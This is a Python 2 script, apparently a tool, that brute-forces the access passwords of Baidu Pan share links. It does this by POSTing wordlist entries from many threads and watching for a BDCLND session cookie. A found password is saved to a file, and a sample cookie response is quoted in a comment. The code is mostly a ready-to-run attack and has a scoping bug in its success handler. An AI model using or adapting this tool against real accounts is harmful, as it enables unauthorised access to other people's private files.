#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import Queue
import sys
import threading
import time
import optparse
import requests
from lib.consle_width import getTerminalSize


class Brute:
    # target: the url to parse
    # thread_num: number of threads
    # after initialization, start method will be call, and run will go
    
    def __init__(self, target, threads_num, dic):
        self.target = target.replace("link", "verify").replace("init", "verify").strip()
        self.names_file = dic 
        self.thread_count = self.threads_num = threads_num
        self.scan_count = self.found_count = 0
        # for stdout writing
        self.lock = threading.Lock()
        self.console_width = getTerminalSize()[0]
        self.console_width -= 2  # Cal width when starts up
        # self.queue is first generated here
        self._load_keys()
        # outfile = target + '.txt' if not output else output
        # self.outfile = open(outfile, 'w')  # won't close manually
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        print 'Brute initialized'

    def _load_keys(self):
        self.queue = Queue.Queue()
        print 'loading ', self.names_file
        with open(self.names_file) as f:
            for line in f:
                sub = line.strip()
                if sub:
                    self.queue.put(sub)
        print 'dictionary enqueued'

    def _update_scan_count(self, count=1):
        self.lock.acquire()
        self.scan_count += count 
        self.lock.release()

    def _print_progress(self):
        self.lock.acquire()
        msg = '%s found | %s remaining | %s scanned in %.2f seconds' % (
            self.found_count, self.queue.qsize(), self.scan_count, time.time() - self.start_time)
        sys.stdout.write('\r' + ' ' * (self.console_width - len(msg)) + msg)
        sys.stdout.flush()
        self.lock.release()
    
    def _check_out(self):
        self.lock.acquire()
        print "\nOK! password found: " + payload
        self.found_count += 1
        f = open("./pass.txt", 'w')
        f.write(payload + '\n')
        f.close()
        self.lock.release()

    def _scan(self, name):
        self.lock.acquire()
        sys.stdout.write('\rinitialing %s'%name)
        sys.stdout.flush()
        time.sleep(0.01)
        self.lock.release()
        while self.queue.qsize() > 0:
            # dequeue keywords
            payload = self.queue.get(timeout=1.0) 
            try:
                # POST every key we have to match
                answer = requests.post(
                    url=self.target,
                    data="pwd=" + payload,
                    headers=self.headers).headers["set-cookie"]
                # answer is often to be found, 
                # but not the unique TOKEN below 
                # X2
                if answer and "BDCLND=" in answer:
                    self._check_out()
            except:
                pass
            self._update_scan_count(1)

        # self.queue already empty
        self._print_progress()
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

        '''    BDCLND=f9ciJq7HsoWZ%2FCpZBxd%2Fkn2GEuOZQofzfKYs22AOoVU%3D; 
            expires=Thu, 25-Feb-2016 13:13:15 GMT;
            path=/; domain=pan.baidu.com, 
            BAIDUID=4FB92D63ED6F4A71CC5888C9312367B9:FG=1; 
            expires=Wed, 25-Jan-17 13:13:15 GMT;
            max-age=31536000; path=/; domain=.baidu.com; version=1
        '''

    # main -> start() -> self.run() -> self._scan()
    def run(self, daemon=True, idle=1):
        self.start_time = time.time()
        for i in range(self.threads_num):
            t = threading.Thread(target=self._scan, args=(str(i),)) 
            t.setDaemon(daemon)
            t.start() # emit every thread
        # found, or not able to match, exit
        while self.thread_count > 0 and self.found_count == 0:
            self._print_progress()
            time.sleep(idle)


if __name__ == '__main__':
    parser = optparse.OptionParser('usage: %prog [options] target_url')
    parser.add_option('-t', '--threads', dest='threads_num',
                      default=10, type='int',
                      help='Number of threads. default = 30')
    parser.add_option('-d', '--dict', dest='dictionary', default=None,
                      type='string', help='keys to use.')

    parser.add_option('-o', '--output', dest='output', default=None,
                      type='string', help='Output file name. default is {target}.txt')

    (options, args) = parser.parse_args()
    # print 'options: ', options
    # print 'args: ', args

    if options.dictionary is None or len(args) < 1 or not any(args[0].startswith(x) for x in ['http', 'https', 'www']):
        parser.print_help()
        sys.exit(0)

    # here args[0] must be target url to parse
    d = Brute(target=args[0],
                   threads_num=options.threads_num, dic = options.dictionary )
    d.run(True)
